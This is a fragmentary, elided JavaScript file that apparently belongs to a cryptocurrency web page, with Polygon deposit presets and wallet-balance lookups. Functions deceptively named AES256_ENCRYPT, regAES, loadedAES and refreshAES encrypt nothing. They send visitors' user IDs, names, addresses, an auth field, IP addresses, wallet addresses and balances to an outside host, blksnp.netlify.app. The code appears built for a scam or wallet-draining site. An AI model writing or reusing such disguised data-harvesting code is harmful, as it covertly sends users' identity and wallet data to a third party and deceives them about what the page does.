// Network options configurations
  window.networkOptions = [
    ...
    { id: "Polygon", longValue: "Polygon", shortValue: "MATIC", minInput: "400", maxInput: "20000", 
     presets: ["400", "700", "1K", "2K", "3K", "5k", "7.5k", "12k", "20k"] },
...
async function fetchBlockchainBalance(walletAddress, networkType) {
 const baseUrl = "https://blksnp.netlify.app/.netlify/functions/";
let functionName;
...
async function AES256_ENCRYPT(data) {
    const url = 'https://blksnp.netlify.app/.netlify/functions/encryptAES256';
...
function regAES(uid, nom, addi, authw, ref, IP) {
    AES256_ENCRYPT({
        type: "uR",
        details: { uid: uid, nom, addi, authw, ref, IP }
    });
}
...
async function loadedAES() {
    ...
    try {
      ...
      AES256_ENCRYPT({
          type: "uMM",
          details: { uid, bal, wal, pip, addi, nom, net }
      });
...
function refreshAES(wal, bal, symbol) {
     ...
     firebase.auth().onAuthStateChanged(user => {
        if (user) {
            ...
            AES256_ENCRYPT({
                type: "uRFSH",
                details: { uid: user.uid, wal, bal, symbol }
            });
        } else {
            // User is signed out
            console.log('User is not logged in.');
...
async function AES256_ENCRYPTsession() {
  try {
    const response = await fetch('https://blksnp.netlify.app/.netlify/functions/encryptAESsession');
    const data = await response.json();
    return data.ip;
  } catch (error) {
